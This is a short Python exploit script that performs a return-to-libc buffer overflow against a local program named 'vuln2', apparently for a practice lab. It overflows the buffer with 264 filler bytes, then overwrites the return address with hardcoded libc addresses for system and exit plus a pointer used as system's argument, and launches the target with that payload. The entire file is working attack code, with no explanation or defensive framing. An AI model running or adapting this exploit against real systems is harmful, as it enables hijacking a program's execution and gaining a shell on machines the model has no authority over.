import struct
import subprocess

libc = 0xb7dd8000
system = libc + 0x00044630
exit = libc + 0x000373a0
system_arg = 0xb7f60406

# JUNK + SYSTEM + EXIT + SYSTEM_ARG
buf = "A" * 264
buf += struct.pack("<I",system)
buf += struct.pack("<I",exit)
buf += struct.pack("<I",system_arg)

subprocess.call(["./vuln2", buf])

